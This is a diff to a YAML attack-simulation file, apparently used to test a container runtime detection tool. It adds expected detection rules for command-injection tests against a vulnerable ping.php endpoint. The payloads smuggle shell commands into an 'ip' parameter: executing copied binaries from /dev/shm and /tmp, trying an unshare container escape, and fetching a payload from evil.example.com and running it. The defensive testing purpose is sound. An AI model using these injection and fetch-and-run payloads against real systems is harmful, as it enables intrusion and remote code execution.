@@ -90,7 +90,13 @@ attacks:
         ip: "127.0.0.1;cp /bin/echo /dev/shm/malicious_webapp && chmod +x /dev/shm/malicious_webapp && /dev/shm/malicious_webapp pwned && rm -f /dev/shm/malicious_webapp"
     successIndicators:
       - bodyContains: "pwned"
-    expectedDetections: []
+    # The payload runs `/dev/shm/malicious_webapp pwned` — R1000 (Fileless
+    # execution) fires for any exec under /dev/shm.
+    expectedDetections:
+      - ruleID: R1000
+        ruleName: Fileless Execution
+        containerName: mywebapp-app
+        command: malicious_webapp
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 5: PRIVILEGE ESCALATION (TA0004) — Container escape attempt
@@ -106,7 +112,13 @@ attacks:
         ip: "127.0.0.1;unshare -r id 2>&1 || echo unshare_blocked"
     successIndicators:
       - statusCode: 200
-    expectedDetections: []
+    # R1006 (Container escape) detects exec of `unshare`/`nsenter`. Even if
+    # the syscall is blocked, the exec attempt fires the rule.
+    expectedDetections:
+      - ruleID: R1006
+        ruleName: Container Escape
+        containerName: mywebapp-app
+        command: unshare
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
@@ -122,7 +134,13 @@ attacks:
         ip: "127.0.0.1;cp /bin/ls /tmp/drifted_webapp && /tmp/drifted_webapp / && rm -f /tmp/drifted_webapp"
     successIndicators:
       - statusCode: 200
-    expectedDetections: []
+    # Exec from /tmp triggers R1001 (Drifted binary) — comm becomes the
+    # basename of the relocated binary.
+    expectedDetections:
+      - ruleID: R1001
+        ruleName: Exec from malicious source
+        containerName: mywebapp-app
+        command: drifted_webapp
 
   # T1070.004 — Indicator Removal: clear bash history
   - name: cmdinject-history-clear
@@ -423,14 +441,32 @@ attacks:
       method: GET
       path: /ping.php
       queryParams:
-        ip: "127.0.0.1;wget -q -O /tmp/payload http://evil.example.com/mal 2>/dev/null || curl -so /tmp/payload http://evil.example.com/mal 2>/dev/null; chmod +x /tmp/payload 2>/dev/null; echo download_attempted"
+        # Download via wget OR curl (whichever the image ships), then EXECUTE
+        # the payload (rabbit pointed out the original chmod'd but never ran it).
+        # The image-shipped binary depends on the base; we MUST assert both.
+        # Trailing "echo download_attempted" remains as a marker for the success
+        # indicator — but the executed /tmp/payload will fail (404 from evil.example.com),
+        # which is fine: the syscall trace shows the exec attempt and that's what
+        # R0001/R1001 catch.
+        ip: "127.0.0.1;wget -q -O /tmp/payload http://evil.example.com/mal 2>/dev/null || curl -so /tmp/payload http://evil.example.com/mal 2>/dev/null; chmod +x /tmp/payload 2>/dev/null; /tmp/payload pwned 2>/dev/null; echo download_attempted"
     successIndicators:
       - bodyContains: "download_attempted"
+    # The image may have wget OR curl (busybox vs full). Assert both so that
+    # whichever path runs, R0001 catches it. The downloaded /tmp/payload that
+    # actually executes also triggers R1001 (drifted binary in /tmp).
     expectedDetections:
       - ruleID: R0001
         ruleName: Unexpected process launched
         containerName: mywebapp-app
         command: wget
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: curl
+      - ruleID: R1001
+        ruleName: Exec from malicious source
+        containerName: mywebapp-app
+        command: payload
 
   # T1552.001 — PHP filter chain LFI (read source code)
   # Classic technique to exfiltrate PHP source via base64 encoding.
